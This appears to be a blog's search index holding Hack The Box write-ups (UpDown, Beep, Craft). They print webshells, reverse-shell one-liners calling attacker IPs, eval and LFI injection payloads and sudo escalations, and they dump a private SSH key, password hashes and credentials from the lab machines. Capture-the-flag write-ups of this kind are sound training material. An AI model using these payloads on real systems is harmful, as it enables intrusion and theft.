I try to get to anything else then checker.php it fails.. so instead of wasting more time, lets dig deeper into .git\n➜  dev git:(main) git log\n[... snip ...]\ncommit 8812785e31c879261050e72e20f298ae8c43b565\nAuthor: Abdou.Y &lt;84577967+ab2pentest@users.noreply.github.com&gt;\nDate:   Wed Oct 20 16:38:54 2021 +0200\n\n    New technique in header to protect our dev vhost.\n\ncommit bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab\nAuthor: Abdou.Y &lt;84577967+ab2pentest@users.noreply.github.com&gt;\nDate:   Wed Oct 20 16:37:20 2021 +0200\n\n    Update .htaccess\n    \n    New technique in header to protect our dev vhost.\n\n\n➜  dev git:(main) git diff bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab\ndiff --git a/.htaccess b/.htaccess\nindex 44ff240..b317ab5 100644\n--- a/.htaccess\n+++ b/.htaccess\n@@ -2,3 +2,4 @@ SetEnvIfNoCase Special-Dev \"only4dev\" Required-Header\n Order Deny,Allow\n Deny from All\n Allow from env=Required-Header\nWith this information, there should be a vhost named dev and we should reach it but using header Special-Dev \"only4dev\". We can verify that this works with curl (curl http://dev.siteisup.htb -H 'Special-Dev: only4dev'), but if you want to view it in Firefox we can add a Session Handling Rule in Burp and invoke the extension Add Custom Header.\nBurp Extension Add Custom Header:\n\nProject Options &gt; Add Session Handling Rules &gt; Invoke a Burp extension:\n\nChange URL Scope and add Proxy to Tools Scope, and you should now be able to browse http://dev.siteisup.htb and upload files:\n\n\n\nStep 2\nWe know from the source code (checker.php) that following extensions is blocked: php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar. We also have to adapt to the max file size of 10kb: $_FILES['file']['size'] &gt; 10000 Lastly, the following wrappers are also blocked: !preg_match(\"#file://#i\",$site) && !preg_match(\"#data://#i\",$site) && !preg_match(\"#ftp://#i\",$site\nReading about file upload on HackTricks these are listed as usefull extensions for PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc\nPlaying around and testing to upload stuff I am able to upload this file:\n➜  updown cat shell.pht\n&lt;?php echo \"Shell\";system($_GET['cmd']); ?&gt;\nHowever when looking in the uploads directory (http://dev.siteisup.htb/uploads/) a directory is created but no file is in the dir.. Going back to the code, this probably have something to do with below line from checker.php, that’s invoked after reading the uploaded file.\n  # Delete the uploaded file.\n    @unlink($final_path);\nAfter a lot of playing around I noticed that when uploading a file, simply add some URL in the end of your code so the server will spend time to check if it’s up or not. This will keep the file alive long enough for us to see the content.\n➜  updown cat shell.phar \n&lt;?php phpinfo(); ?&gt;\nhttps://exploit.se\nhttps://exploit.se\n\nThe disabled_functions are as following:\npcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen\nOur normal one-line webshell are hurting since system, passthru, shell_exec, exec, popen and pcntl_exec are all disabled, however proc_open is not. Here’s a list of dangerous php functions.\nTo stream line this process I wrote a script to write a malicious .phar file, upload the it to the target and gather the data. The script have two flags..\n.. -c / --command for command injection\n.. -r / reverse automatically trigger a reverse shell\n➜  updown python3 updown_rce.py -c \"hostname && id\"\n\n  _   _       ____                      \n | | | |_ __ |  _ \\  _____      ___ __  \n | | | | '_ \\| | | |/ _ \\ \\ /\\ / / '_ \\ \n | |_| | |_) | |_| | (_) \\ V  V /| | | |\n  \\___/| .__/|____/ \\___/ \\_/\\_/ |_| |_|\n       |_|     by 0xPThree - exploit.se \n       \n\n[+] File uploaded to: http://dev.siteisup.htb/uploads/1e0087c3c8c5df2f1f97f1cd169b705f/05f6adf04d44.phar\n[+] Executing command 'hostname && id'...\n[+] Response: updown\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\nhttps://exploit.se\n\ntime elapsed: 0.284085750579834 seconds\n➜  updown python3 updown_rce.py -r                 \n\n  _   _       ____                      \n | | | |_ __ |  _ \\  _____      ___ __  \n | | | | '_ \\| | | |/ _ \\ \\ /\\ / / '_ \\ \n | |_| | |_) | |_| | (_) \\ V  V /| | | |\n  \\___/| .__/|____/ \\___/ \\_/\\_/ |_| |_|\n       |_|     by 0xPThree - exploit.se \n       \n\n[+] File uploaded to: http://dev.siteisup.htb/uploads/102fe1680abe9017c824e82855db0674/71926ca1faf8.phar\n[+] Preparing reverse shell\n[+] Starting listener on port 4488\nlistening on [any] 4488 ...\nconnect to [10.10.14.14] from (UNKNOWN) [10.129.4.182] 41428\n/bin/sh: 0: cant access tty; job control turned off\n$ id && hostname\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nupdown\nFull script is found HERE.\n\n\nStep 3\nWith a shell, the privilege escalation vector is quite obvious, we have SUID bit as developer on siteisup binary:\nwww-data@updown:/home/developer/dev$ ls -al\ntotal 32\ndrwxr-x--- 2 developer www-data   4096 Jun 22 15:45 .\ndrwxr-xr-x 6 developer developer  4096 Aug 30 11:24 ..\n-rwsr-x--- 1 developer www-data  16928 Jun 22 15:45 siteisup\n-rwxr-x--- 1 developer www-data    154 Jun 22 15:45 siteisup_test.py\n\nwww-data@updown:/home/developer/dev$ file siteisup\nsiteisup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5bbc1de286529f5291b48db8202eefbafc92c1f, for GNU/Linux 3.2.0, not stripped\nWe can assume that the code from siteisup is the same as the python script:\nwww-data@updown:/home/developer/dev$ cat siteisup_test.py\nimport requests\n\nurl = input(\"Enter URL here:\")\npage = requests.get(url)\nif page.status_code == 200:\n    print \"Website is up\"\nelse:\n    print \"Website is down\"\nimport() is generally seen as a dangerous function, together with eval() and exec(), we can easily break out from the program and get a shell as developer:\nwww-data@updown:/home/developer/dev$ ./siteisup\nWelcome to 'siteisup.htb' application\n\nEnter URL here:__import__('os').system('/bin/bash')\ndeveloper@updown:/home/developer/dev$ id\nuid=1002(developer) gid=33(www-data) groups=33(www-data)\n\ndeveloper@updown:/home/developer$ cat user.txt\n107ab9b44d8853f426ebe841cdae9cbf\n\ndeveloper@updown:/home/developer/.ssh$ cat id_rsa\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n\n\n\n\nROOT\n\nStep 1\nRunning sudo -l shows us the privilege escalation vector:\ndeveloper@updown:/dev/shm$ sudo -l\nMatching Defaults entries for developer on localhost:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser developer may run the following commands on localhost:\n    (ALL) NOPASSWD: /usr/local/bin/easy_install\nLooking up easy_install on gtfobins we get the syntax to instantly spawn a root shell.\ndeveloper@updown:/dev/shm$ TF=$(mktemp -d)\ndeveloper@updown:/dev/shm$ echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)')\" &gt; $TF/setup.py\ndeveloper@updown:/dev/shm$ sudo /usr/local/bin/easy_install $TF\nWARNING: The easy_install command is deprecated and will be removed in a future version.\nProcessing tmp.i7LFwunRkU\nWriting /tmp/tmp.i7LFwunRkU/setup.cfg\nRunning setup.py -q bdist_egg --dist-dir /tmp/tmp.i7LFwunRkU/egg-dist-tmp-2bXqH_\n# id\nuid=0(root) gid=0(root) groups=0(root)\n\n# cat /root/root.txt\n72fa86fbc9173578b5df7f17dd9d3933\n\n# cat /etc/shadow \nroot:$6$35UwqDmGM31K3z1O$EV0yHaLbvEqQ1YfxHOl4fMFHnR0O0Lo7RSnFGpYdfUwBmec0/5JWenL6GLivYgeka8Z4XyYW2UhWOV5UOdK0w.:19165:0:99999:7:::\ndeveloper:$6$LkPh3nNMEVO.zmIc$I/j67KSo1n7pR.fzcMfH/hc/8EYISX8JUtDpoc7iMIiYEhX4bgVXPV4L6Gam3AvxMd46wh5XTulsxbpy9ezLf/:19165:0:99999:7:::"
  },
  {
    "objectID": "posts/2020-07-27-htb-writeup-beep/2020-07-27-htb-writeup-beep.html",
    "href": "posts/2020-07-27-htb-writeup-beep/2020-07-27-htb-writeup-beep.html",
    "title": "Beep - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@nidus:/git/htb/beep# nmap -Pn -n 10.10.10.7 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-30 11:22 CEST Nmap scan report for 10.10.10.7 Host is up (0.037s latency). Not shown: 988 closed ports PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 80/tcp open http 110/tcp open pop3 111/tcp open rpcbind 143/tcp open imap 443/tcp open https 993/tcp open imaps 995/tcp open pop3s 3306/tcp open mysql 4445/tcp open upnotifyp 10000/tcp open snet-sensor-mgmt\nDIRB:\nNIKTO:\nLooking on port 80 we are instantly forwarded to the 443 version prompting us with a Elastix login screen. Googling for this we find bunch of exploits, amongst other a authenticated RCE privesc and a unauthenticated LFI that seems promising.\nroot@nidus:/git/htb/beep# searchsploit elastix —————————————————————————————————————————- ——————————— Exploit Title | Path —————————————————————————————————————————- ——————————— .. Elastix 2.2.0 - ‘graph.php’ Local File Inclusion | php/webapps/37637.pl —————————————————————————————————————————- ———————————\nReading the code (searchsploit -x 37637.pl) we find that is real simple and can be done directly in the browser. #LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action\nVisit: https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action\nIn all the text we find the following lines: # This is the default admin name used to allow an administrator to login to ARI bypassing all security. # Change this to whatever you want, don’t forget to change the ARI_ADMIN_PASSWORD as well ARI_ADMIN_USERNAME=admin\n# This is the default admin password to allow an administrator to login to ARI bypassing all security. # Change this to a secure password. ARI_ADMIN_PASSWORD=jEhdIekWmdjE\nLogging in to the site gives me the message “Error - Access denied for 10.10.14.4. The host has been blocked because of too many authentication failures”\nWait for the block go timeout, and then login to the elastix service, https://10.10.10.7/. Continue to search for elastix exploits we find a RCE: FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution | php/webapps/18650.py\nJust like previous exploit, this is a one-liner that can be used from the URL. For it to work we need to specify LHOST = 10.10.14.10 LPORT = 4488 RHOST = 10.10.10.7 EXTENSION = ?\nLooking in Elastix &gt; PBX we find the extension ‘Fanis Papafanopoulos &lt;233&gt;’, so set this value to 233. Setup a listener and paste your one-liner to exploit.\nhttps://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.10%3a4488%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A\n[root:/git/htb/beep]# nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.10] from (UNKNOWN) [10.10.10.7] 40047 whoami asterisk python -c ‘import pty;pty.spawn(“/bin/bash”)’ bash-3.2$\nbash-3.2$ sudo -l Matching Defaults entries for asterisk on this host: env_reset, env_keep=“COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY”\nUser asterisk may run the following commands on this host: (root) NOPASSWD: /sbin/shutdown (root) NOPASSWD: /usr/bin/nmap (root) NOPASSWD: /usr/bin/yum (root) NOPASSWD: /bin/touch (root) NOPASSWD: /bin/chmod (root) NOPASSWD: /bin/chown (root) NOPASSWD: /sbin/service (root) NOPASSWD: /sbin/init (root) NOPASSWD: /usr/sbin/postmap (root) NOPASSWD: /usr/sbin/postfix (root) NOPASSWD: /usr/sbin/saslpasswd2 (root) NOPASSWD: /usr/sbin/hardware_detector (root) NOPASSWD: /sbin/chkconfig (root) NOPASSWD: /usr/sbin/elastix-helper\nbash-3.2$ sudo /usr/bin/nmap –interactive Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ ) Welcome to Interactive Mode – press h  for help nmap&gt; !sh sh-3.2# whoami root\n sh-3.2# cat /home/fanis/user.txt\n   6e81a26eb20987c5ef0602984f0f66ee\n\n cat /root/root.txt\n   f024f39974fa0274157fbe11845fffa7\n\n(3). We got a password, trying password re-use seems to be a play here as well - we instantly get root. Grab the flags.\nroot@nidus:/git/htb/beep# ssh root@beep.htb\n  Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1\nroot@nidus:/git/htb/beep# ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 root@beep.htb\n  root@beep.htb's password: jEhdIekWmdjE\n    Last login: Tue Jul 16 11:45:47 2019\n\n    Welcome to Elastix\n    ----------------------------------------------------\n\n    To access your Elastix System, using a separate workstation (PC/MAC/Linux)\n    Open the Internet Browser using the following URL:\n    http://10.10.10.7\n\n  [root@beep ~]# cat root.txt\n    d88e006123842106982acce0aaf453f0\n  [root@beep ~]# ls -al /home/\n    total 28\n    drwxr-xr-x  4 root       root       4096 Apr  7  2017 .\n    drwxr-xr-x 22 root       root       4096 Jul 30 12:10 ..\n    drwxrwxr-x  2 fanis      fanis      4096 Apr  7  2017 fanis\n    drwx------  2 spamfilter spamfilter 4096 Apr  7  2017 spamfilter\n  [root@beep ~]# cat /home/fanis/user.txt\n    aeff3def0c765c2677b94715cffa73ac\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\n\n\n\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nElastix LFI: https://www.exploit-db.com/exploits/37637"
  },
  {
    "objectID": "posts/2019-10-13-htb-writeup-craft/2019-10-13-htb-writeup-craft.html",
    "href": "posts/2019-10-13-htb-writeup-craft/2019-10-13-htb-writeup-craft.html",
    "title": "Craft - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nnmap -Pn -sC -sV -n 10.10.10.110 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0) 443/tcp open ssl/http nginx 1.15.8 6022/tcp open x11\nAccess HTTPS and look around, notice that gogs.craft.htb and api.craft.htb is not reachable (icons in top right corner of the page). Add the URLs in /etc/hosts: 10.10.10.110 gogs.craft.htb api.craft.htb\nLook around on gogs.craft.htb and you can find a test script by Dinesh, containing his username and password (dinesh:4aUh0A8PbVJxgd) https://gogs.craft.htb/Craft/craft-api/commit/10e3ba4f0a09c778d7cec673f28d410b73455a86\nUsing these credentials we can get a token from the API (https://api.craft.htb/api/) or using curl. API: https://api.craft.htb/api/\nCURL: curl -k -u dinesh:4aUh0A8PbVJxgd https://api.craft.htb/api/auth/login {“token”:“eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcwNjA5ODM0fQ.WRjbAWd7WEpOhoL34hSlGmA92c2bCtYmboNKPG1Oie8”}\nWith the credentials and token, we now have a way to POST/PUT information onto the server, now we need to find a way to exploit this. Login as Dinesh on gogs.craft.htb, add your SSH-key and download the repository. Looking through the files we can find the Source Code for brew.py. Looking through brew.py we can find that they use a eval-function for input validation of ‘abv’, this makes it vulnerable for Code Injection.\nNOTE: You don’t need to download the files, they can also be viewed directly on gogs.craft.htb, but I think it’s easier to download\nmake sure the ABV value is sane.\nif eval(‘%s &gt; 1’ % request.json[‘abv’]): return “ABV must be a decimal value less than 1.0”, 400 else: create_brew(request.json) return None, 201\nExploit the abv eval-function. Start netcat and send a POST through the API. Capture it in burp and edit the request by adding a valid token (created by Dinesh) and inject desired code in the abv-field.\nPOST /api/brew/ HTTP/1.1 Host: api.craft.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: application/json Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://api.craft.htb/api/ content-type: application/json origin: https://api.craft.htb Content-Length: 96 Connection: close X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxMTMzMDkwfQ.m2NfNIDs-bqUcuqRzYXITIQ5lWXHtENnijqLiIcMgMQ\n{ “id”: 2352, “brewer”: “string”, “name”: “string”, “style”: “string”, “abv”: “import(‘os’).system(‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&1|nc 10.10.14.12 4488 &gt;/tmp/f’)” }\nroot@p3:/opt/htb/machines/craft# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.12] from (UNKNOWN) [10.10.10.110] 42163 /bin/sh: can’t access tty; job control turned off /opt/app #\nAt first glance you are user root, but you can’t access any flags, seems like we are in a docker and need to break out. Looking through the scripts and .gitignore there are a lot of references to settings.py, looking in that file we find a db user and password. (craft:qLGockJ6G2J75O) The script dbtest.py calls settings.py to get information from the database brew. In craft_api/api/database/models.py we can find a second database, User. Download dbtest.py and edit to call user database. Notice that we also need to change result from cursor.fetchone() to cursor.fetchall() to get all info within the database.\nroot@p3:/opt/htb/machines/craft/craft-api# cat exp-db.py #!/usr/bin/env python\nimport pymysql from craft_api import settings\n# test connection to mysql database\nconnection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST, user=settings.MYSQL_DATABASE_USER, password=settings.MYSQL_DATABASE_PASSWORD, db=settings.MYSQL_DATABASE_DB, cursorclass=pymysql.cursors.DictCursor)\ntry: with connection.cursor() as cursor: sql = “SELECT id, username, password FROM user” cursor.execute(sql) result = cursor.fetchall() print(result)\nfinally: connection.close()\n\nroot@p3:/opt/htb/machines/craft/craft-api# python3 -m http.server 8888\n/opt/app # wget http://10.10.14.12:8888/exp-db.py Connecting to 10.10.14.12:8888 (10.10.14.12:8888) exp-db.py 100% |********************************| 664 0:00:00 ETA\n/opt/app # chmod +x exp-db.py /opt/app # python exp-db.py [{‘id’: 1, ‘username’: ‘dinesh’, ‘password’: ‘4aUh0A8PbVJxgd’}, {‘id’: 4, ‘username’: ‘ebachman’, ‘password’: ‘llJ77D8QFkLPQB’}, {‘id’: 5, ‘username’: ‘gilfoyle’, ‘password’: ‘ZEU3N8WNM2rh4T’}]\n\nGilfoyle reuses his credentials for gogs.craft.htb, login to his account and you’ll find his public and private SSH-keys. Download the private key, give it chmod 600, and SSH with same creds again.\nroot@p3:/opt/htb/machines/craft# ssh gilfoyle@10.10.10.110 -i id_rsa-gilf\n. * .. . * *\n\n\n@()Ooc()* o . (Q@0CGO()  |______/|/ _\n| | | | | / | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | _| | | | | | |_/ |_|||/| ______/\n\n\nEnter passphrase for key ‘id_rsa-gilf’: Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64\nThe programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Mon Oct 14 07:18:13 2019 from 10.10.14.21 gilfoyle@craft:~$\nGrab user-flag. gilfoyle@craft:~$ cat /home/gilfoyle/user.txt bbf4****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nLogin with Gilfoyle’s creds on gogs.craft.htb, in the repo craft-infra you’ll find a folder named vault and within it secrets.sh Vault is used to provide one-time passwords (OTP) for SSH login, I google’d ‘vault ssh’ and the first link I found explains how to request a OTP. https://learn.hashicorp.com/vault/secrets-management/sm-ssh-otp#step-3-request-an-otp\nIn their example they write: vault write ssh/creds/otp_key_role ip=\nTrying this gives us an error: * Role “otp_key_role” not found Looking at secrets.sh we find that the ‘vault write’-string ends with root_otp, lets try that instead: gilfoyle@craft:~$ vault write ssh/creds/root_otp ip=10.10.10.110 Key Value — —– lease_id ssh/creds/root_otp/bdbe45d6-24b0-6a02-8534-d37bbb3f54c5 lease_duration 768h lease_renewable false ip 10.10.10.110 key 1762e6a1-f975-61f8-814e-f7d65a2a1f51 key_type otp port 22 username root\nNOTE: The key value is the OTP to use during SSH authentication.\nSSH with the OTP-creds generated and grab root.txt. root@p3:/opt/htb/machines/craft# ssh root@10.10.10.110 root@craft:~# cat root.txt 831d****************************"
  },
  {
    "objectID": "posts/2021-03-19-htb-writeup-jerry/2021-03-19-htb-writeup-jerry.html",
    "href": "posts/2021-03-19-htb-writeup-jerry/2021-03-19-htb-writeup-jerry.html",
    "title": "Jerry - Hack The Box",
    "section": "",
